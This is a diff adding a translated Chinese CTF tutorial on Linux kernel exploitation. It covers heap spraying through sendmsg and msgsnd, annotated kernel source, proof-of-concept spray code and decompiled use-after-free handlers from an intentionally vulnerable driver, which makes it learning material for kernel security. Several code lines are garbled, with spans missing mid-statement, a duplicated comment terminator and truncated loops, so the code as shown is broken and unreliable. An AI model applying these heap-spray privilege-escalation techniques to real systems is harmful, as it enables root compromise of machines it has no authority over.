@@ -1,0 +1,227 @@
+# Kernel Pwn 学习之路 - 番外
+##### 译文声明
+本文是翻译文章
+译文仅供参考，具体内容表达以及含义原文为准。
+## 0x01 前言
+由于关于Kernel安全的文章实在过于繁杂，本文有部分内容大篇幅或全文引用了参考文献，若出现此情况的，将在相关内容的开头予以说明，部分引用参考文献的将在文件结尾的参考链接中注明。
+从本篇番外开始，将会记录在`CTF`中`Kernel Pwn`的一些思路，由于与`Kernel Pwn
+学习之路(X)`系列的顺序学习路径有区别，故单独以番外的形式呈现。
+本文将会以实例来说几个Linux提权思路，本文主要依托于以下两个文章分析：
+[linux内核提权系列教程（1）：堆喷射函数sendmsg与msgsend利用](https://xz.aliyun.com/t/6286)
+[linux内核提权系列教程（2）：任意地址读写到提权的4种方法 – bsauce](https://xz.aliyun.com/t/6296)
+## 0x02 堆喷射执行任意代码(Heap Spray)
+###  关于堆喷射
+`Heap Spray`是在`shellcode`的前面加上大量的`slide
+code`(滑板指令)，组成一个注入代码段。然后向系统申请大量内存，并且反复用注入代码段来填充。这样就使得进程的地址空间被大量的注入代码所占据。然后结合其他的漏洞攻击技术控制程序流，使得程序执行到堆上，最终将导致`shellcode`的执行。
+传统`slide
+code`(滑板指令)一般是`NOP`指令，但是随着一些新的攻击技术的出现，逐渐开始使用更多的类`NOP`指令，譬如`0x0C`(`0x0C0C`代表的`x86`指令是`OR
+AL 0x0C`），`0x0D`等等，不管是`NOP`还是`0C`，它们的共同特点就是不会影响`shellcode`的执行。
+###  Linux Kernel中的Heap Spray
+首先，内核中的内存分配使用`slub`机制而不是`libc`机制，我们的利用核心就是在内核中寻找是否有
+**一些函数可以被我们直接调用，且在调用后会在内核空间申请指定大小的`chunk`，并把用户的数据拷贝过去**。
+###  常用的漏洞函数 —— sendmsg
+####  源码分析
+`sendmsg`函数在`/v4.6-rc1/source/net/socket.c#L1872`中实现
+    static int ___sys_sendmsg(
+        struct socket *sock, struct user_msghdr __user *msg,
+        struct msghdr *msg_sys, 
+        unsigned int flags,
+        struct used_address *used_address,
+        unsigned int allowed_msghdr_flags)
+    {
+        struct compat_msghdr __user *msg_compat = (struct compat_msghdr __user *)msg;
+        struct sockaddr_storage address;
+        struct iovec iovstack[UIO_FASTIOV], *iov = iovstack;
+        // 创建 44 字节的栈缓冲区 ctl ，此处的 20 是 ipv6_pktinfo 结构的大小
+        unsigned char ctl[sizeof(struct cmsghdr) + 20]
+            __attribute__ ((aligned(sizeof(__kernel_size_t))));
+        // 使 ctl_buf 指向栈缓冲区 ctl
+        unsigned char *ctl_buf = ctl;
+        int ctl_len;
+        ssize_t err;
+        msg_sys->msg_name = &address;
+        if (MSG_CMSG_COMPAT & flags)
+            err = get_compat_msghdr(msg_sys, msg_compat, NULL, &iov);
+        else
+            // 将用户数据的 msghdr 消息头部拷贝到 msg_sys
+            err = copy_msghdr_from_user(msg_sys, msg, NULL, &iov);
+        if (err msg_controllen > INT_MAX)
+            goto out_freeiov;
+        flags |= (msg_sys->msg_flags & allowed_msghdr_flags);
+        //如果用户提供的 msg_controllen 大于 INT_MAX，就把 ctl_len 赋值为用户提供的 msg_controllen
+        ctl_len = msg_sys->msg_controllen;
+        if ((MSG_CMSG_COMPAT & flags) && ctl_len) {
+            err = cmsghdr_from_user_compat_to_kern(msg_sys, sock->sk, ctl, sizeof(ctl));
+            if (err)
+                goto out_freeiov;
+            ctl_buf = msg_sys->msg_control;
+            ctl_len = msg_sys->msg_controllen;
+        } else if (ctl_len) {
+            // 注意此处要求用户数据的size必须大于 ctl 大小，即44字节
+            if (ctl_len > sizeof(ctl)) {
+                // sock_kmalloc 会最终调用 kmalloc 分配 ctl_len 大小的堆块
+                ctl_buf = sock_kmalloc(sock->sk, ctl_len, GFP_KERNEL);
+                if (ctl_buf == NULL)
+                    goto out_freeiov;
+            }
+            err = -EFAULT;
+            /*
+             * Careful! Before this, msg_sys->msg_control contains a user pointer.
+             * Afterwards, it will be a kernel pointer. Thus the compiler-assisted
+             * checking falls down on this.
+             * msg_sys->msg_control 是用户可控的用户缓冲区
+             * ctl_len 是用户可控的长度
+             * 这里将用户数据拷贝到 ctl_buf 内核空间。
+             */
+             */
+            if (copy_from_user(ctl_buf, (void __user __force *)msg_sys->msg_control, ctl_len))
+                goto out_freectl;
+            msg_sys->msg_control = ctl_buf;
+        }
+        msg_sys->msg_flags = flags;
+        ......
+    }
+那么，也就是说，只要我们的用户数据大于`44`字节，我们就能够申请下来一个我们指定大小的Chunk，并向其填充数据，完成了堆喷的要件。
+####  POC
+    // 此处要求 BUFF_SIZE > 44
+    char buff[BUFF_SIZE];
+    struct msghdr msg = {0};
+    struct sockaddr_in addr = {0};
+    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(6666);
+    // 布置用户空间buff的内容
+    msg.msg_control = buff; // 此处的buff即为我们意图布置的数据
+    msg.msg_controllen = BUFF_SIZE; 
+    msg.msg_name = (caddr_t)&addr;
+    msg.msg_namelen = sizeof(addr);
+    // 假设此时已经产生释放对象，但指针未清空
+    for(int i = 0; i mtype))
+            return -EFAULT;
+        return do_msgsnd(msqid, mtype, msgp->mtext, msgsz, msgflg);
+    }
+    // In /v4.6-rc1/source/ipc/msg.c#L609
+    long do_msgsnd(int msqid, long mtype, void __user *mtext, size_t msgsz, int msgflg)
+    {
+        struct msg_queue *msq;
+        struct msg_msg *msg;
+        int err;
+        struct ipc_namespace *ns;
+        ns = current->nsproxy->ipc_ns;
+        if (msgsz > ns->msg_ctlmax || (long) msgsz next; seg != NULL; seg = seg->next) {
+            len -= alen;
+            src = (char __user *)src + alen;
+            alen = min(len, DATALEN_SEG);
+            // 第二次将我们用户的输入传入目标位置
+            if (copy_from_user(seg + 1, src, alen))
+                goto out_err;
+        }
+        err = security_msg_msg_alloc(msg);
+        if (err)
+            goto out_err;
+        return msg;
+    out_err:
+        free_msg(msg);
+        return ERR_PTR(err);
+    }
+    // In /v4.6-rc1/source/ipc/msgutil.c#L51
+    #define DATALEN_MSG    ((size_t)PAGE_SIZE-sizeof(struct msg_msg))
+    #define DATALEN_SEG    ((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))
+    static struct msg_msg *alloc_msg(size_t len)
+    {
+        struct msg_msg *msg;
+        struct msg_msgseg **pseg;
+        size_t alen;
+        alen = min(len, DATALEN_MSG);
+        // 实际分配的大小将是 msg_msg 结构大小加上我们用户传入的大小
+        msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL);
+        ......
+    }
+`do_msgsnd()`根据用户传递的`buffer`和`size`参数调用`load_msg(mtext,
+msgsz)`，`load_msg()`先调用`alloc_msg(msgsz)`创建一个`msg_msg`结构体，然后拷贝用户空间的`buffer`紧跟`msg_msg`结构体的后面，相当于给`buffer`添加了一个头部，因为`msg_msg`结构体大小等于`0x30`，因此用户态的`buffer`大小等于`xx-0x30`。也就是说
+**我们输入的前`0x30`字节不可控，也就是说我们的滑板代码中可能会被插入阻塞代码**。
+####  POC
+    struct {
+        long mtype;
+        char mtext[BUFF_SIZE];
+    }msg;
+    // 布置用户空间的内容
+    memset(msg.mtext, 0x42, BUFF_SIZE-1); 
+    msg.mtext[BUFF_SIZE] = 0;
+    int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
+    msg.mtype = 1; //必须 > 0
+    // 假设此时已经产生释放对象，但指针未清空
+    for(int i = 0; i 
+####  构建vulnerable_linux_driver
+首先需要编译官方推荐使用的`4.6.0-rc1`版本内核，编译完成后，使用项目给出的`MAKEFILE`将其编译成为内核模块。
+这里的文件系统可以使用如下`init`文件：
+    #!/bin/sh
+    mount -t devtmpfs none /dev
+    mount -t proc proc /proc
+    mount -t sysfs sysfs /sys
+    #
+    # module
+    #
+    insmod /lib/modules/*/*.ko
+    chmod 666 /dev/vulnerable_device
+    #
+    # shell
+    #
+    cat /etc/issue
+    export ENV=/etc/profile
+    setsid cttyhack setuidgid 1000 sh
+    umount /proc
+    umount /sys
+    umount /dev
+    poweroff -f
+####  模块漏洞分析
+这里我们为了更贴近实战，使用`IDA`进行分析，并且为了演示堆喷射，这里仅分析其`Use-After-Free`漏洞。
+首先是用于交互的`do_ioctl`函数我们首先通过带有`uaf`表示的变量来寻找相关的交互函数：
+  1. **申请并初始化一个Chunk，交互码`0xFE03`：**
+        if ( cmd != 0xFE03 )
+        return 0LL;
+    // 分配一个UAF对象
+    v13 = (uaf_obj *)kmem_cache_alloc_trace(kmalloc_caches[1], 0x24000C0LL, 0x58LL);
+    if ( v13 )
+    {
+        v13->arg = (__int64)v4;
+        // fn 指向回调函数 uaf_callback
+        v13->fn = (void (*)(__int64))uaf_callback;
+        // 第一个缓冲区 uaf_first_buff 填充 "A"
+        *(_QWORD *)v13->uaf_first_buff = 0x4141414141414141LL;
+        *(_QWORD *)&v13->uaf_first_buff[8] = 0x4141414141414141LL;
+        *(_QWORD *)&v13->uaf_first_buff[16] = 0x4141414141414141LL;
+        *(_QWORD *)&v13->uaf_first_buff[24] = 0x4141414141414141LL;
+        *(_QWORD *)&v13->uaf_first_buff[32] = 0x4141414141414141LL;
+        *(_QWORD *)&v13->uaf_first_buff[40] = 0x4141414141414141LL;
+        *(_QWORD *)&v13->uaf_first_buff[48] = 0x4141414141414141LL;
+        // global_uaf_obj 全局变量指向该对象
+        global_uaf_obj = v13;
+        printk(&unk_6A8); // 4[x] Allocated uaf object [x]
+    }
+  2. **调用一个Chunk的fn指针，交互码`0xFE04`：**
+        if ( cmd == 0xFE04 )
+    {
+        if ( !global_uaf_obj->fn )
+            return 0LL;
+        v14 = global_uaf_obj->arg;
+        printk(&unk_809); // 4[x] Calling 0x%p(%lu)[x]
+        ((void (__fastcall *)(__int64))global_uaf_obj->fn)(global_uaf_obj->arg);
+        result = 0LL;
+    }
+  3. **创建一个`k_obj`，并向其传入数据，交互码`0x8008FE05`：**
+        if ( cmd == 0x8008FE05 )
+      {
+        v17 = kmem_cache_alloc_trace(kmalloc_caches[1], 0x24000C0LL, 0x60LL);
+        if ( v17 )
+        {
+          copy_from_user(v17, v4, 0x60LL);
+          printk(&unk_825);
+        }
+        else
+        {
+          printk(&unk_6C8);
+        }
+        return 0LL;
+      }
